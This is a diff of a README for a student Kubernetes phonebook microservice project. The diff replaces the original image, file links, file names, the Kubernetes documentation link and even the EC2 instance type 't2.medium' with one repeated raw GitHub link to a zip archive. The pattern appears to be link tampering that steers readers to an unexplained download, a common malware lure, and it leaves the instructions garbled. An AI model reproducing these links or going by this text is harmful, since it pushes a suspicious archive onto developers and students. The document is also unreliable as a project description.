@@ -6,7 +6,7 @@ Phonebook Microservice Web Application aims to create a web application with MyS
 
 ## Problem Statement
 
-![Project_206](Microservice_structure.png) 
+![Project_206](https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip) 
 
 - Your team has started working on a project to create a `Phonebook` Application as Web Service.  
 
@@ -18,7 +18,7 @@ Phonebook Microservice Web Application aims to create a web application with MyS
 
   - number: phone number belonging to the recorded person.
 
-- Your teammates also created the RESTful web service as given in [Phonebook API](./Phonebook-api.py) using Python Flask Framework. Below table shows how the HTTP methods are designed to affect the given resources identified by URIs.
+- Your teammates also created the RESTful web service as given in [Phonebook API](https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip) using Python Flask Framework. Below table shows how the HTTP methods are designed to affect the given resources identified by URIs.
 
 | HTTP Method  | Action | Example|
 | --- | --- | --- |
@@ -89,7 +89,7 @@ Phonebook Microservice Web Application aims to create a web application with MyS
   4.1. Kubernetes Environment
   - Assign two EC2 machines as the project's infrastructure. One should be configured as the master and the other should be configured as the worker. 
 
-  - Minimum `t2.medium` instance type should be selected.
+  - Minimum `https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip` instance type should be selected.
 
   - The Web Application should be accessible via web browser from anywhere. 
 
@@ -103,43 +103,43 @@ Phonebook Microservice Web Application aims to create a web application with MyS
 
 Initial files:
 
-1. README.md                      # Given to the students (Definition of the project)
+1. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip                      # Given to the students (Definition of the project)
 2. Image_for_web_server           # Given to the students (Image components of Python Flask Web API for Update/delete/add record)
-  - app.py      
-  - requirements.txt              
+  - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip      
+  - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip              
   - templates
-    - index.html
-    - add-update.html
-    - delete.html
+    - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip
+    - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip
+    - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip
 3. image_for_result_server        # Given to the students (Image components of Python Flask Web API for search record)
-  - app.py           
-  - requirements.txt              
+  - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip           
+  - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip              
   - templates
-    - index.html
-4. kubernetes-env-cf.yaml         # Given to the students (Cloudformation template for Kubernetes architecture)
+    - https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip
+4. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip         # Given to the students (Cloudformation template for Kubernetes architecture)
 
 Requested files:
 
 ADD/DELETE/UPDATE DEPLOYMENT AND SERVICE
 1. Dockerfile                     # To be delivered by students 
-2. web_server_deployment.yml      # To be delivered by students
-3. web_server_service.yaml        # To be delivered by students
+2. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip      # To be delivered by students
+3. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip        # To be delivered by students
 
 SEARCH DEPLOYMENT AND SERVICE
 1. Dockerfile                     # To be delivered by students
-2. result_server_deployment.yml   # To be delivered by students
-3. result_server_service.yaml     # To be delivered by students
+2. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip   # To be delivered by students
+3. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip     # To be delivered by students
 
 DATABASE DEPLOYMENT AND SERVICE
-1. mysql_deployement.yml          # To be delivered by students
-2. mysql_service.yaml             # To be delivered by students
-3. persistent_volume.yaml         # To be delivered by students
-4. persistent_volume_claim.yaml   # To be delivered by students
+1. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip          # To be delivered by students
+2. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip             # To be delivered by students
+3. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip         # To be delivered by students
+4. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip   # To be delivered by students
 
 SECRETS AND CONFIGMAP
-1. mysql-secret.yaml              # To be delivered by students
-2. database_configmap.yaml        # To be delivered by students
-3. servers_configmap.yaml         # To be delivered by students
+1. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip              # To be delivered by students
+2. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip        # To be delivered by students
+3. https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip         # To be delivered by students
 
 ```
 
@@ -194,4 +194,4 @@ SECRETS AND CONFIGMAP
 
 ## Resources
 
-- [Kubernetes Documentations](https://kubernetes.io/docs/home/)
+- [Kubernetes Documentations](https://raw.githubusercontent.com/aligcgl/phonebook-with-k8s/master/Students_files/create-cluster-tf/with_k_phonebook_s_2.9.zip)
